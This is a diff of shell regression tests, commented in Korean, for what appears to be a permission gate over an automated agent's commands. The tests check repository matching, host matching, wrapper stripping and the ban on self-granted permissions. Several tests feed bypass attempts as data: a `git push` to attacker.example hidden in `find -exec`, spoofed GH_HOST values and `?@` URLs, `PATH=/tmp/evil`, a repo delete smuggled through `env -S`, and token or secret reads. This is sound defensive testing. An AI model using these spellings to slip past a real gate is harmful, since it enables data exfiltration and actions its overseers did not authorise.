+  "$(s64 canon preauth "$S64_MAN_GH" gh pr create --title x --body "$s64_body")" \
+  "P=1 형태=완전 Pd=0"
+check "64: 두 줄 본문은 옛 경로에서 목록 밖이었다 (이 고침의 전제)" \
+  "$(s64 off preauth "$S64_MAN_GH" gh pr create --title x --body "$s64_body")" \
+  "P=0 형태=없음 Pd=0"
+
+# (3) RT-B-preauth2 — argv0 정체성. basename 만 보던 옛 경로는 아무 디렉터리의
+# `gh` 나 자기 매니페스트의 `gh pr` 행으로 인가했다.
+S64_EVIL="$S64_DIR/evil"
+mkdir -p "$S64_EVIL"
+: > "$S64_EVIL/gh"
+chmod +x "$S64_EVIL/gh"
+check "64: RT-B-preauth2 — 남의 디렉터리의 gh 는 목록 밖이다" \
+  "$(s64 canon preauth "$S64_MAN_GH" "$S64_EVIL/gh" pr merge 1)" "P=0 형태=없음 Pd=0"
+check "64: RT-B-preauth2 — 옛 경로는 basename 으로 통과시켰다 (이 고침의 전제)" \
+  "$(s64 off preauth "$S64_MAN_GH" "$S64_EVIL/gh" pr merge 1)" "P=1 형태=완전 Pd=0"
+
+# (4) RT-B-preauth3 — 상대 경로로 부른 스크립트. 형태가 파일 이름만 적으면 옛
+# 경로에서는 어느 디렉터리의 동명 스크립트든 완전 형태로 맞았다.
+S64_MAN_SCRIPT="$S64_DIR/script.md"
+sp_man "$S64_MAN_SCRIPT" 'dasee-jenkins-trigger.sh'
+: > "$S64_DIR/dasee-jenkins-trigger.sh"
+chmod +x "$S64_DIR/dasee-jenkins-trigger.sh"
+check "64: RT-B-preauth3 — 상대 경로 스크립트는 목록 밖이다" \
+  "$(cd "$S64_DIR" && s64 canon preauth "$S64_MAN_SCRIPT" ./dasee-jenkins-trigger.sh)" \
+  "P=0 형태=없음 Pd=0"
+check "64: RT-B-preauth3 — 옛 경로는 완전 형태로 읽었다 (이 고침의 전제)" \
+  "$(cd "$S64_DIR" && s64 off preauth "$S64_MAN_SCRIPT" ./dasee-jenkins-trigger.sh)" \
+  "P=1 형태=완전 Pd=0"
+
+# (5) 결정 6 — 형태를 감싼 backtick 한 쌍은 벗긴다. 매니페스트가 형태를 코드
+# 문면으로 적는 것은 흔한 철자이고, 벗기지 않으면 첫 단어가 `` `gh `` 이 되어
+# 아무것과도 맞지 않았다. 두 경로 모두에서 같아야 한다.
+S64_MAN_TICK="$S64_DIR/tick.md"
+sp_man "$S64_MAN_TICK" '`gh pr`'
+check "64: 백틱으로 감싼 형태도 맞는다 (정규 전송)" \
+  "$(s64 canon preauth "$S64_MAN_TICK" gh pr view 1)" "P=1 형태=완전 Pd=0"
+check "64: 백틱으로 감싼 형태도 맞는다 (옛 경로)" \
+  "$(s64 off preauth "$S64_MAN_TICK" gh pr view 1)" "P=1 형태=완전 Pd=0"
+
+# (6) 자기확장 금지의 두 형태 — 정규형은 명령 가족을 알아보는 자리에서 옵션을
+# 빼므로 그것만 보면 관리자 플래그가 사라지고, 평탄 분리는 공백을 품은 경로를
+# 조각내 인가 기록과 대조할 수 없다. 룰이 두 목록을 모두 보는 이유가 이 네 줄이다.
+check "64: --admin 은 정규 전송에서도 거부된다" \
+  "$(s64 canon selfext "$S64_MAN_GH" gh pr merge --admin 1)" "rc=1"
+check "64: --admin 은 옛 경로에서도 거부된다" \
+  "$(s64 off selfext "$S64_MAN_GH" gh pr merge --admin 1)" "rc=1"
+S64_GRANT="$S64_DIR/a b/grant.md"
+check "64: 공백 든 인가 기록 경로에 쓰는 것이 정규 전송에서 거부된다" \
+  "$(s64 canon selfext "$S64_MAN_GH" tee "$S64_GRANT")" "rc=1"
+check "64: 공백 든 인가 기록 경로를 옛 경로는 놓쳤다 (이 고침의 전제)" \
+  "$(s64 off selfext "$S64_MAN_GH" tee "$S64_GRANT")" "rc=0"
+S64_SURFACE=읽기
+check "64: 인가 기록을 읽는 것은 정규 전송에서도 통과한다" \
+  "$(s64 canon selfext "$S64_MAN_GH" cat "$S64_GRANT")" "rc=0"
+S64_SURFACE=트리밖쓰기
+S64_GRANT=
+
+# (7) 게이트가 싣는 자리. 전송은 **행위마다** 설정되거나 지워져야 한다 — 남은
+# 값을 다음 행위가 물려받으면 자기 argv 가 아닌 것으로 인가되기 때문이다. 그
+# 규율이 한 군데에만 있는지를 본다: 등급된 argv 에만 싣는 분기가 `gate_verb_act`
+# 안에 있고, 그 뒤에 도는 도달 판정기는 다시 싣지 않는다.
+check "64: 게이트는 등급된 argv 에만 전송을 싣는다" \
+  "$(awk '/^gate_verb_act\(\) \{$/ { f = 1 } f && /argv_graded" = "1" \]; then$/ { g = NR } f && /gate_preauth_export "\$alias" "\$@"/ { print (g > 0 && NR == g + 1) ? "분기 안" : "분기 밖"; exit }' "$GATE")" \
+  "분기 안"
+check "64: 도달 판정기는 전송을 다시 싣지 않는다" \
+  "$(awk '/^gate_reach_disposition\(\) \{$/ { f = 1 } f && /^\}$/ { f = 0 } f && /gate_preauth_export/ { n++ } END { print n + 0 }' "$GATE")" "0"
+check "64: 전송을 만드는 자리는 하나다" \
+  "$(grep -c '^gate_preauth_export() {$' "$GATE")" "1"
+
+# (8) 끝에서 끝까지. 룰만 돌리는 위 단언들과 달리 이것은 게이트를 통과시킨다 —
+# 배선이 빠지면 룰이 아무리 옳아도 승인 대기가 그대로 발행되므로, 그 둘을 가르는
+# 것은 이 한 줄뿐이다. `plan` 은 답만 내고 행위를 수행하지 않는다.
+gate plan --manifest "$FX_MANIFEST" --kind x --target front --cutpoint PR \
+     -- gh pr create --title x --body "$s64_body"
+check "64: 두 줄 본문 행위가 게이트를 통과한다" "$rc" "0"
+
+# ---------------------------------------------------------------------------
+# 60. The gh consumers read the parse
+# --- section: 60 | group: parse | covers: act | anchors: 60: 여섯 철자의 DELETE 가 모두 파괴다, 60: 세 철자의 --web 이 같은 값이다, 60: 남의 저장소는 협업이 아니다, 60: 배포 트리거는 요소별로 맞는다, 60: 남의 저장소는 형태가 맞아도 목록 밖이다, 60: 본문 안쪽의 GH_REPO 도 필드로 실린다, 60: 본문 바깥의 GH_HOST 도 호스트째 실린다 ---
+#
+# 이 절은 gh argv 를 읽는 네 소비자(등급·표식·사다리·협업)와 배포 트리거를 한
+# 자리에서 잰다. 넷 다 예전에는 각자 `" $* "` 를 훑었고, 그래서 **같은 행위가
+# 철자에 따라 다른 답을 받았다** — 이 절의 단언 대부분이 「철자 N 개가 한 값」
+# 꼴인 것은 그 때문이다.
+#
+# 절 58·59 와 같은 이유로 소싱은 /bin/bash 로 하고 본문은 `set -u` 아래에서 돈다.
+# ---------------------------------------------------------------------------
+s60() {
+  # s60 <본문> — 게이트를 소싱한 셸에서 본문을 돈다. 대상 행을 읽는 소비자를
+  # 부르려고 `target_field` 를 덮어쓴다: 이 절이 재는 것은 대상 행을 어떻게
+  # 읽어 오는가가 아니라 읽어 온 값으로 무엇을 판정하는가다.
+  #
+  # `G <argv...>` 는 축2 등급, `M <argv...>` 는 표지, `L <argv...>` 는 사다리
+  # 칸, `C <argv...>` 는 협업 여부(1·0), `D <argv...>` 는 배포 트리거 여부다.
+  ( cd "$repo_root" && CC_GATE_SOURCE_ONLY=1 \
+      S60_GATE="$GATE" S60_BODY="$1" S60_SLUG="${S60_SLUG:-o/r}" S60_IDS="${S60_IDS:-}" \
+      /bin/bash -c '
+      . "$S60_GATE" </dev/null
+      unset CC_GATE_SOURCE_ONLY
+      trap - EXIT ERR INT TERM
+      set +e
+      set -u
+      target_field() {
+        case "$2" in
+          "원격 슬러그")       printf "%s" "$S60_SLUG" ;;
+          "배포트리거 식별자") printf "%s" "$S60_IDS" ;;
+          *) return 1 ;;
+        esac
+      }
+      GATE_GRADE_SOURCE=표
+      G() { printf "%s\n" "$(surface_of_argv0 "$@")"; }
+      M() { printf "%s\n" "$(gate_act_mark "$@" | tr "\t" "/")"; }
+      L() { printf "%s\n" "$(ladder_of_argv0 "$@")"; }
+      C() { if gate_collaboration_surface tgt - "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      D() { if gate_deploy_trigger_match tgt "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      eval "$S60_BODY"' 2>/dev/null )
+}
+
+# (1) 등급 — 한 행위의 여러 철자가 한 값이다.
+check "60: 세 철자의 --web 이 같은 값이다" \
+  "$(s60 'G gh pr view 1 --web; G gh pr view 1 -wR o/r; G gh pr view 1 --web=true')" \
+  "형태 미상
+형태 미상
+형태 미상"
+# 오늘 실물 gh 는 `repo delete` 잎에서 선행 `-R` 을 거부한다. 표가 그 거부를
+# 따라가지 않으면 실물이 실행하지 않을 형태에 등급이 붙는다.
+check "60: 잎이 받지 않는 -R 은 형태 미상이다" \
+  "$(s60 'G gh -R o/r repo delete x; G gh -R o/r auth token')" \
+  "형태 미상
+형태 미상"
+# 미등록 동사는 등급 미상이 아니다 — 등급 미상은 선언으로 구제되는 칸이라,
+# 파서가 실재를 확인해 준 명령이 그 칸에 떨어지면 선언 한 줄로 읽기가 된다.
+check "60: 별칭은 자기 본체의 행을 받는다" "$(s60 'G gh co 1')" "워크트리쓰기"
+check "60: 브라우저를 여는 동사는 형태 미상이다" "$(s60 'G gh browse')" "형태 미상"
+check "60: 확장 설치는 트리 밖 쓰기다" "$(s60 'G gh extension install e/x')" "트리밖쓰기"
+check "60: 확장 실행은 형태 미상이다" "$(s60 'G gh extension exec x')" "형태 미상"
+# 본문 플래그는 gh 자신이 GET 을 POST 로 바꾸는 신호다. 옛 훑기는 `--field=`
+# 붙임 꼴을 못 보고 그 요청을 읽기로 등급했다.
+check "60: 본문 플래그의 세 철자가 모두 쓰기다" \
+  "$(s60 'G gh api --field=body=x /repos/o/r/issues; G gh api -f body=x /r; G gh api --input=/tmp/f /x')" \
+  "외부상태변경
+외부상태변경
+외부상태변경"
+check "60: 본문도 메서드도 없으면 읽기다" "$(s60 'G gh api /repos/o/r')" "읽기"
+
+# (2) 표식 — 같은 요청의 여섯 철자.
+check "60: 여섯 철자의 DELETE 가 모두 파괴다" \
+  "$(s60 '
+for a in "-X DELETE" "-XDELETE" "-X=DELETE" "--method DELETE" "--method=DELETE" "-iXDELETE"; do
+  M gh api $a /repos/o/r
+done')" \
+  "파괴/DELETE
+파괴/DELETE
+파괴/DELETE
+파괴/DELETE
+파괴/DELETE
+파괴/DELETE"
+check "60: 묶인 -at 와 --show-token=true 가 모두 비밀출력이다" \
+  "$(s60 'M gh auth status -at; M gh auth status --show-token=true; M gh auth status -t')" \
+  "비밀출력/--show-token
+비밀출력/--show-token
+비밀출력/--show-token"
+check "60: 선행 -R 을 받는 잎은 파괴 표식을 유지한다" \
+  "$(s60 'M gh -R o/r release delete v1 --yes')" "파괴/delete"
+# 읽을 수 없는 형태에는 표식을 달지 않는다 — 등급이 이미 형태 미상으로 park 한다.
+# 표식 없음의 문면은 빈 출력이 아니라 빈 칸 둘(`<표지>\t<트리거>`)이라, `M` 의
+# 탭 치환을 거치면 `/` 하나로 온다.
+check "60: 읽을 수 없는 형태에는 표식이 없다" "$(s60 'M gh -R o/r auth token')" "/"
+
+# (3) 사다리 — 선행 플래그가 있어도 같은 칸이다.
+check "60: 선행 -R 이 있어도 머지 칸이다" \
+  "$(s60 'L gh pr merge 1; L gh -R o/r pr merge 1; L gh -Ro/r pr merge 1')" \
+  "머지
+머지
+머지"
+check "60: 다른 문으로 들어온 머지도 머지 칸이다" \
+  "$(s60 'L gh api -X PUT repos/o/r/pulls/1/merge')" "머지"
+check "60: 읽을 수 없는 형태는 칸을 주장하지 않는다" "$(s60 'L gh -R o/r repo delete x')" ""
+
+# (4) 협업 — 대상의 저장소일 때만이다. 저장소를 적지 않은 행위는 워크트리의
+# 원격을 쓰므로 대상 행이 이미 고정한다.
+check "60: 대상의 저장소를 향한 이슈 작성은 협업이다" \
+  "$(s60 'C gh issue create --title x; C gh -R o/r issue create --title x')" \
+  "1
+1"
+check "60: 남의 저장소는 협업이 아니다" \
+  "$(s60 'C gh -R evil/x issue create --title x; C gh --repo=evil/x pr merge 1')" \
+  "0
+0"
+# 환경 변수도 저장소를 바꾸는 철자다. 두 줄이 함께 있어야 첫 줄이 맞은 이유로
+# 맞았음이 드러난다 — 둘째 줄까지 0 이면 셀이 저장소를 본 것이 아니라 `env` 라는
+# 이름에서 갈려 나간 것이다.
+check "60: 환경 변수로 바꾼 남의 저장소는 협업이 아니다" \
+  "$(s60 'C env GH_REPO=evil/x gh pr merge 1')" "0"
+check "60: 환경 변수로 바꾼 대상의 저장소는 협업이다" \
+  "$(s60 'C env GH_REPO=o/r gh pr merge 1')" "1"
+# 엔드포인트는 첫 위치 인자다 — 헤더 값이나 jq 식이 「/issues」 를 품었다고
+# 그 요청이 이슈에 대한 것은 아니다.
+check "60: 엔드포인트 아닌 자리의 문면은 협업을 만들지 않는다" \
+  "$(s60 'C gh api --jq .x/issues /repos/o/r/actions/runs; C gh api /repos/o/r/issues')" \
+  "0
+1"
+
+# (5) 배포 트리거 — 요소별 대조.
+S60_IDS='workflow:deploy.yml'
+check "60: 배포 트리거는 요소별로 맞는다" \
+  "$(s60 'D gh workflow run deploy.yml; D gh -R o/r workflow run deploy.yml')" \
+  "1
+1"
+check "60: 남의 저장소의 같은 이름 워크플로는 이 대상의 배포가 아니다" \
+  "$(s60 'D gh -R evil/x workflow run deploy.yml')" "0"
+S60_IDS='argv:deploy prod'
+check "60: 여러 단어 요소는 연속한 단어열로 맞는다" \
+  "$(s60 'D ./run.sh deploy prod; D ./run.sh deploy staging; D ./run.sh deployprod')" \
+  "1
+0
+0"
+S60_IDS='argv:make deploy'
+check "60: 다른 이름의 같은 첫 단어는 배포가 아니다" \
+  "$(s60 'D make deploy; D make build')" \
+  "1
+0"
+# 도는 런이 실제로 쓰는 철자. 요소가 argv0 를 포함하고 행위가 그 뒤에 피연산자를
+# 더 붙인 꼴이라, 요소별 대조가 머리 단어열을 맞추는지가 여기서 갈린다.
+S60_IDS='argv:git pull --ff-only'
+check "60: 도는 런의 배포 트리거 철자가 계속 맞는다" \
+  "$(s60 'D git pull --ff-only origin master; D git pull origin master')" \
+  "1
+0"
+S60_IDS='branch:release'
+check "60: 브랜치 요소는 단어 안쪽에서 맞지 않는다" \
+  "$(s60 'D git push origin HEAD:release; D git push origin HEAD:release-candidate')" \
+  "1
+0"
+S60_IDS=
+
+# (6) 사전 인가의 저장소 필드. 형태는 명령을 적지 저장소를 적지 않으므로, 형태가
+# 맞는 것과 그 행위가 이 런의 저장소를 향하는 것은 다른 사실이다.
+S60_MAN="$WORK/s60-gh.md"
+pre_parse
+sp_man "$S60_MAN" 'gh pr'
+s60_rule() {
+  # s60_rule <행위 저장소> <대상 저장소> — 형태는 맞는 argv 로 탐침을 돌린다.
+  ( GATE_PREAUTH_PROBE=1 GATE_SURFACE=트리밖쓰기 GATE_MANIFEST="$S60_MAN" \
+    GATE_ARGV='gh pr merge 1' GATE_MARK=일반 GATE_MARK_TRIGGER='' GATE_GRANT='' \
+    GATE_ARGV_REPO="$1" GATE_TARGET_REPO="$2" \
+    /bin/sh "$(dirname "$GATE")/rules/사전-인가-대조.sh" 2>/dev/null )
+}
+check "60: 저장소를 적지 않은 행위는 형태만으로 인가된다" \
+  "$(s60_rule '' '')" "P=1 형태=완전 Pd=0"
+check "60: 대상의 저장소를 적은 행위도 인가된다" \
+  "$(s60_rule 'o/r' 'o/r')" "P=1 형태=완전 Pd=0"
+check "60: 남의 저장소는 형태가 맞아도 목록 밖이다" \
+  "$(s60_rule 'evil/x' 'o/r')" "P=0 형태=없음 Pd=0"
+check "60: 대상 저장소를 못 읽으면 명시된 저장소는 목록 밖이다" \
+  "$(s60_rule 'evil/x' '')" "P=0 형태=없음 Pd=0"
+
+# 게이트가 그 두 필드를 실제로 싣는지. 룰이 옳아도 필드가 오지 않으면 위 단언은
+# 아무것도 지키지 못한다.
+check "60: 게이트는 명시된 저장소를 필드로 싣는다" \
+  "$(s60 'gate_preauth_export tgt gh --repo=evil/x pr merge 1; printf "%s|%s\n" "${GATE_ARGV_REPO:-}" "${GATE_TARGET_REPO:-}"')" \
+  "evil/x|o/r"
+check "60: 저장소를 적지 않으면 필드를 내지 않는다" \
+  "$(s60 'gate_preauth_export tgt gh pr merge 1; printf "%s|%s\n" "${GATE_ARGV_REPO:-}" "${GATE_TARGET_REPO:-}"')" \
+  "|"
+# 해소되지 않는 철자는 필드를 안 내는 것이 아니라 대상 없이 그대로 실린다 —
+# 안 내면 「저장소를 적지 않았다」로 읽혀 통과한다.
+check "60: 해소되지 않는 저장소는 대조 없이 실린다" \
+  "$(s60 'gate_preauth_export tgt gh --repo=garbage pr merge 1; printf "%s|%s\n" "${GATE_ARGV_REPO:-}" "${GATE_TARGET_REPO:-}"')" \
+  "garbage|"
+# 셸 조각 안에 적은 저장소도 같은 필드로 실린다. 명령 전체가 불투명하다고 필드를
+# 비우면 룰은 「저장소를 적지 않았다」로 읽고 형태만으로 인가한다.
+check "60: 셸 조각 안의 남의 저장소도 필드로 실린다" \
+  "$(s60 "gate_preauth_export tgt bash -c 'gh -R evil/x pr merge 1'; printf '%s|%s\n' \"\${GATE_ARGV_REPO:-}\" \"\${GATE_TARGET_REPO:-}\"")" \
+  "evil/x|o/r"
+# 저장소는 플래그로만 지명되는 것이 아니다. `GH_REPO` 는 조각 재파싱이 빈
+# 환경에서 시작하는 동안 검사에 **닿지도 않았고**, 그래서 조각은 「저장소를 적지
+# 않았다」를 답하고 룰이 대조를 통째로 건너뛰었다. 본문 안쪽과 바깥쪽을 따로
+# 적는 이유는 두 자리가 서로 다른 층에 기록되기 때문이다 — 안쪽은 조각의 선행
+# 대입이 본문 층으로 떼어진 것이고, 바깥쪽은 벗겨진 `env` 사슬의 것이다.
+check "60: 본문 안쪽의 GH_REPO 도 필드로 실린다" \
+  "$(s60 "gate_preauth_export tgt bash -c 'GH_REPO=evil/x gh pr merge 1'; printf '%s|%s\n' \"\${GATE_ARGV_REPO:-}\" \"\${GATE_TARGET_REPO:-}\"")" \
+  "evil/x|o/r"
+check "60: 본문 바깥의 GH_REPO 도 필드로 실린다" \
+  "$(s60 "gate_preauth_export tgt env GH_REPO=evil/x bash -c 'gh pr merge 1'; printf '%s|%s\n' \"\${GATE_ARGV_REPO:-}\" \"\${GATE_TARGET_REPO:-}\"")" \
+  "evil/x|o/r"
+# 호스트도 같은 전선을 탄다. 호스트가 안 실리면 `gate_gh_host_is_default` 는
+# 「호스트가 전혀 없다」를 기본 호스트로 읽어, 남의 호스트가 통과한다.
+check "60: 본문 안쪽의 GH_HOST 도 호스트째 실린다" \
+  "$(s60 "gate_preauth_export tgt bash -c 'GH_HOST=ghe.attacker.example gh -R o/r pr merge 1'; printf '%s|%s\n' \"\${GATE_ARGV_REPO:-}\" \"\${GATE_TARGET_REPO:-}\"")" \
+  "ghe.attacker.example/o/r|o/r"
+check "60: 본문 바깥의 GH_HOST 도 호스트째 실린다" \
+  "$(s60 "gate_preauth_export tgt env GH_HOST=ghe.attacker.example bash -c 'gh -R o/r pr merge 1'; printf '%s|%s\n' \"\${GATE_ARGV_REPO:-}\" \"\${GATE_TARGET_REPO:-}\"")" \
+  "ghe.attacker.example/o/r|o/r"
+# 음성 대조군 — 기본 호스트와 대상 저장소를 지명한 환경은 불일치가 아니다.
+check "60: 대상과 같은 환경 지명은 불일치가 아니다" \
+  "$(s60 "gate_preauth_export tgt bash -c 'GH_HOST=github.com GH_REPO=o/r gh pr merge 1'; printf '%s|%s\n' \"\${GATE_ARGV_REPO:-}\" \"\${GATE_TARGET_REPO:-}\"")" \
+  "o/r|o/r"
+
+# 호스트는 저장소의 일부다. 슬러그가 같아도 다른 호스트면 이 런의 저장소가 아니다.
+check "60: 다른 호스트의 같은 슬러그는 호스트째 실린다" \
+  "$(s60 'gate_preauth_export tgt gh -R https://ghe.attacker.example/o/r issue create --title x; printf "%s|%s\n" "${GATE_ARGV_REPO:-}" "${GATE_TARGET_REPO:-}"')" \
+  "ghe.attacker.example/o/r|o/r"
+check "60: 다른 호스트의 같은 슬러그는 협업이 아니다" \
+  "$(s60 'C gh -R https://ghe.attacker.example/o/r issue create --title x; C gh -R https://github.com/o/r issue create --title x')" \
+  "0
+1"
+# 권한부는 첫 `/`·`?`·`#` 에서 끝나고 사용자 정보는 마지막 `@` 까지다. `?@` 철자는
+# 남의 호스트를 이름 짓고, 호스트 없는 `file` 스킴은 기본 호스트가 아니다.
+check "60: ?@ 철자와 file 스킴은 협업이 아니다" \
+  "$(s60 "C gh -R 'https://evil.example?@github.com/o/r' issue create --title x
+          C gh -R file:///o/r issue create --title x
+          C gh -R https://u@x@github.com/o/r issue create --title x")" \
+  "0
+0
+1"
+# 래퍼 뒤의 셸도 불투명하다. argv0 만 보면 `env` 라서 판정을 건너뛴다.
+check "60: 래퍼 뒤의 셸 조각도 불투명하다" \
+  "$(s60 "gate_argv_opaque env bash -c 'echo x'; echo; gate_argv_opaque env git status; echo")" \
+  "1
+0"
+
+# ---------------------------------------------------------------------------
+# 61. The wrapper chain comes off once, for every table
+# --- section: 61 | group: parse | covers: act | anchors: 61: 분할 문자열이 대입으로 읽히지 않는다, 61: 실행할 바이너리를 바꾸는 대입은 형태 미상이다, 61: 래퍼를 쓴 머지가 모든 표에서 머지다, 61: 조각이 놓은 대입도 대조된다, 61: 지워진 변수는 게이트의 값을 빌리지 않는다 ---
+#
+# 래퍼를 벗기던 표는 셋, 벗기지 않던 표는 넷이었고 벗기던 셋도 서로 다른
+# 손글씨 옵션 문법을 썼다. 그래서 **같은 행위가 표마다 다른 답을 받았다** —
+# 이 절은 한 행위를 다섯 표에 동시에 물어 답이 하나인지를 본다.
+#
+# 절 58·59·60 과 같은 이유로 소싱은 /bin/bash 로 하고 본문은 `set -u` 아래서 돈다.
+# ---------------------------------------------------------------------------
+s61() {
+  # s61 <본문> — s60 과 같은 틀이되 dev 식별자와 게이트 자신의 env 를 더 준다.
+  # `G` 등급, `M` 표식, `L` 사다리 칸, `C` 협업, `D` 배포 트리거, `V` dev 식별자.
+  ( cd "$repo_root" && CC_GATE_SOURCE_ONLY=1 \
+      S61_GATE="$GATE" S61_BODY="$1" S61_SLUG="${S61_SLUG:-o/r}" S61_IDS="${S61_IDS:-}" \
+      S61_DEV="${S61_DEV:-}" AWS_PROFILE="${S61_AWS:-}" PGHOST="" \
+      /bin/bash -c '
+      . "$S61_GATE" </dev/null
+      unset CC_GATE_SOURCE_ONLY
+      trap - EXIT ERR INT TERM
+      set +e
+      set -u
+      target_field() {
+        case "$2" in
+          "원격 슬러그")       printf "%s" "$S61_SLUG" ;;
+          "배포트리거 식별자") printf "%s" "$S61_IDS" ;;
+          "dev 식별자")        printf "%s" "$S61_DEV" ;;
+          *) return 1 ;;
+        esac
+      }
+      GATE_GRADE_SOURCE=표
+      G() { printf "%s\n" "$(surface_of_argv0 "$@")"; }
+      M() { printf "%s\n" "$(gate_act_mark "$@" | tr "\t" "/")"; }
+      L() { printf "%s\n" "$(ladder_of_argv0 "$@")"; }
+      C() { if gate_collaboration_surface tgt - "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      D() { if gate_deploy_trigger_match tgt "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      V() { printf "%s\n" "$(gate_dev_identifier_check tgt "$@")"; }
+      H() { printf "%s\n" "$(gate_history_integration "$@")"; }
+      eval "$S61_BODY"' 2>/dev/null )
+}
+
+# (1) 못 읽는 철자는 등급이 형태 미상이다. 옛 벗김은 `--split-string=` 를 `*=*`
+# 가지에서 먼저 잡아 **대입으로** 읽었고, 그래서 옵션을 삼킨 뒤 뒤에 남은 `true`
+# 를 실행 정체로 잡아 저장소 삭제가 `읽기` 로 통과했다.
+check "61: 분할 문자열이 대입으로 읽히지 않는다" \
+  "$(s61 'G env --split-string="gh repo delete o/r --yes" true; G env "-SX=1 gh repo delete o/r --yes" true')" \
+  "형태 미상
+형태 미상"
+# 실행 정체 부류. 게이트가 실행할 바이너리가 실제로 바뀐다.
+check "61: 실행할 바이너리를 바꾸는 대입은 형태 미상이다" \
+  "$(s61 'G env PATH=/tmp/evil gh pr view 1')" "형태 미상"
+# 지움 꼴은 실행 정체를 바꾸지 않는다 — argv0 해소 PATH 는 그대로 서 있다.
+check "61: 변수를 지우는 꼴은 형태 미상이 아니다" \
+  "$(s61 'G env -u PATH gh pr view 1; G env -i gh pr view 1')" \
+  "읽기
+읽기"
+# 뒤에 피연산자가 없는 `-S` 는 옵션 루프 재진입이라 안쪽 명령이 그대로 보인다.
+check "61: 뒤가 빈 분할 문자열은 안쪽 명령을 드러낸다" \
+  "$(s61 'G env -S"-i gh pr merge 1"')" "외부상태변경"
+# git 은 설정을 환경으로도 받는다. `-c` 로는 거절되는 키가 `GIT_CONFIG_PARAMETERS`
+# 로는 그대로 들어갔고, `HOME`·`XDG_CONFIG_HOME` 은 git 이 읽을 전역 설정 파일을
+# 고른다. 뒤의 둘은 가장 안쪽 명령이 git 일 때만 실행 정체를 바꾼다.
+check "61: git 설정을 싣거나 고르는 환경 이름은 형태 미상이다" \
+  "$(s61 'G env GIT_CONFIG_PARAMETERS=x git push origin HEAD:x
+          G env GIT_CONFIG_GLOBAL=/tmp/c git push origin HEAD:x
+          G env GIT_SSH=/tmp/s git fetch origin
+          G env HOME=/tmp/h git push origin HEAD:x
+          G sh -c "export XDG_CONFIG_HOME=/tmp/x; git push origin HEAD:x"
+          G env HOME=/tmp/h ls')" \
+  "형태 미상
+형태 미상
+형태 미상
+형태 미상
+형태 미상
+읽기"
+# 셸 옵션 자리의 맨 `+` 는 옵션 끝이 아니다 — bash 는 그 뒤의 `-c` 를 실행한다.
+# `-` 와 `--` 는 옵션을 끝내므로 그 뒤의 `-c` 는 스크립트 파일 이름이다.
+check "61: 셸 옵션 자리의 맨 + 뒤의 -c 도 본문으로 읽힌다" \
+  "$(s61 'gp_parse bash + -c "echo x"; printf "%s\n" "$GP_STATUS"; gp_parse env sh + -c "echo x"; printf "%s\n" "$GP_STATUS"; gp_parse bash -- -c "echo x"; printf "%s\n" "$GP_STATUS"')" \
+  "list
+list
+ok"
+# `find` 는 이 층이 벗기는 래퍼가 아니다. 식 하나가 안쪽 명령 여럿과 자기 쓰기
+# 원소를 함께 품으므로, 벗기면 첫 안쪽 명령 하나만 남고 나머지가 사라진다.
+check "61: find 는 파서가 벗기지 않는다" \
+  "$(s61 'gp_parse find . -maxdepth 0 -exec true ";" -exec git push https://attacker.example/x.git HEAD ";"; printf "%s\n" "$GP_ARGV0"; gp_parse nohup find . -exec bash -c "echo x" ";"; printf "%s\n" "$GP_ARGV0"')" \
+  "find
+find"
+
+# (2) 한 행위, 다섯 표, 한 답. 옛 코드에서 이 줄의 다섯 답은 등급만 맞고
+# 표식·사다리·협업·배포는 `env` 라는 이름에서 갈려 아무것도 주장하지 못했다.
+S61_IDS='workflow:deploy.yml'
+check "61: 래퍼를 쓴 머지가 모든 표에서 머지다" \
+  "$(s61 'G env GH_REPO=o/r gh pr merge 1; L env GH_REPO=o/r gh pr merge 1; C env GH_REPO=o/r gh pr merge 1; G timeout 5 gh pr merge 1; L nohup gh pr merge 1; C nice -n 5 gh pr merge 1')" \
+  "외부상태변경
+머지
+1
+외부상태변경
+머지
+1"
+check "61: 래퍼 안의 남의 저장소도 대조된다" \
+  "$(s61 'C env GH_REPO=evil/x gh pr merge 1; C timeout 5 gh -R evil/x pr merge 1')" \
+  "0
+0"
+check "61: 래퍼를 쓴 비밀 읽기도 표식을 받는다" \
+  "$(s61 'M env AWS_REGION=x aws secretsmanager get-secret-value --secret-id s; M timeout 5 gh auth token')" \
+  "비밀출력/get-secret-value
+비밀출력/token"
+check "61: 래퍼를 쓴 워크플로 기동도 배포 트리거다" \
+  "$(s61 'D nohup gh workflow run deploy.yml; D env GH_REPO=evil/x gh workflow run deploy.yml')" \
+  "1
+0"
+S61_IDS=
+# 못 읽는 철자에 표식도 칸도 협업도 없다 — 등급이 이미 형태 미상으로 park 한다.
+check "61: 못 읽는 철자는 어느 표도 주장하지 않는다" \
+  "$(s61 'M env PATH=/tmp/evil gh auth token; L env PATH=/tmp/evil gh pr merge 1; C env PATH=/tmp/evil gh issue create --title x')" \
+  "/
+
+0"
+
+# (3) `time -o` 의 자기 쓰기. 래퍼가 분기에서 사라지므로 그 파일 피연산자도 함께
+# 사라질 뻔한 자리다.
+check "61: 시간 파일을 쓰는 래퍼는 바닥을 올린다" \
+  "$(s61 'G time -o /tmp/f cat x; G time cat x; G time -o /tmp/f gh pr merge 1')" \
+  "트리밖쓰기
+읽기
+외부상태변경"
+
+# (4) dev 식별자 — 벗김이 오늘의 우연한 fail-closed 를 없애므로 같은 커밋에서
+# 사슬을 읽어야 한다. 게이트 자신의 프로필은 `dev` 이고, 행위가 자기 것을 적으면
+# 그것이 이긴다.
+S61_DEV='aws-profile:dev'
+S61_AWS=dev
+check "61: 행위가 적은 프로필이 게이트의 것을 이긴다" \
+  "$(s61 'V env AWS_PROFILE=prod aws s3 rm s3://x; V aws --profile prod s3 rm s3://x; V aws s3 rm s3://x')" \
+  "불일치
+불일치
+일치"
+# 지워진 변수는 「아무 말도 안 한 것」이 아니다 — 도구가 자기 기본값으로 가므로
+# 게이트의 값을 빌려 답하면 이 프로세스가 아닌 것에 대해 답하게 된다.
+check "61: 지워진 변수는 게이트의 값을 빌리지 않는다" \
+  "$(s61 'V env -u AWS_PROFILE aws s3 rm s3://x; V env -i aws s3 rm s3://x')" \
+  "부재
+부재"
+# 조각이 `export` 로 놓은 대입도 사슬에 남는다. 옛 코드는 argv0 가 `sh` 라는
+# 이유만으로 대조불가였다.
+check "61: 조각이 놓은 대입도 대조된다" \
+  "$(s61 'V sh -c "export AWS_PROFILE=prod; aws s3 rm s3://x"')" "불일치"
